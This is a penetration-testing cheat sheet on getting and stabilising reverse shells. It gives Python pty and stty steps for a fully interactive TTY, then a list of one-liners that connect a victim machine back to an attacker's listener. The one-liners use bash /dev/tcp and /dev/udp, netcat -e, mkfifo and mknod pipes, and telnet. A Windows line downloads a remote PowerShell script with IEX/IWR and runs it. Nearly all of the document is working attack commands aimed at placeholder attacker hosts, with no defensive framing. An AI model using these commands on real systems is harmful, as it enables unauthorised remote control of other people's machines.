# Linux fully interactive tty
1. use python 2 or python3 `pty` module's `spawn` function
	1. `python -c 'import pty; pty.spawn("/bin/bash")'`
	2. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. use `CTRL + Z` to background the shell
3. use `stty size` to view the terminal dimensions *to be used in step #7*
4. use `stty raw -echo` then `fg`
5. type `reset` even if you don't see visual feedback
6. when the reverse shell is back, set your `SHELL` and `TERM` environement variables
`export SHELL=/bin/bash && export TERM=xterm-256color`
7. set terminal size using `stty rows <number> columns <number>`
`size=$(stty size); rows=$(echo $size | cut -d' ' -f1); cols=$(echo $size | cut -d' ' -f2); echo "[*] setting stty rows to $rows and columns to $cols"; echo "stty rows $rows columns $cols"`

# Windows better tty using `rlwrap`
1. install rlwrap using `apt install rlwrap`
2. using rlwrap before your standard listener `rlwrap nc -lvnp <LPORT>`

# Windows fully interactive (Windows 10 / Windows Server 2019 version 1809)
## on attacker machine:
`stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>`
## on victim machine:
`IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>`

# Bash
1. `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`
2. `exec 5<>/dev/tcp/<LHOST>/<LPORT>; cat <&5 | while read line; do $line 2>&5 >&5; done`

## Bash/Netcat:
`nc -nv <LHOST> <LPORT> -e /bin/bash`

## mkfifo:
`rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc <LHOST> <LPORT> > /tmp/pipe; rm /tmp/pipe`

## mknod:
`rm /tmp/pipe; mknod /tmp/pipe p 2>/dev/null && nc <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe`

## Bash UDP
1. victim: `sh -i >& /dev/udp/<LHOST>/<LPORT> 0>&1`
2. attacker: `nc -u -lvp <LPORT>`

# Telnet
`rm /tmp/pipe; mknod /tmp/pipe p && telnet <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe`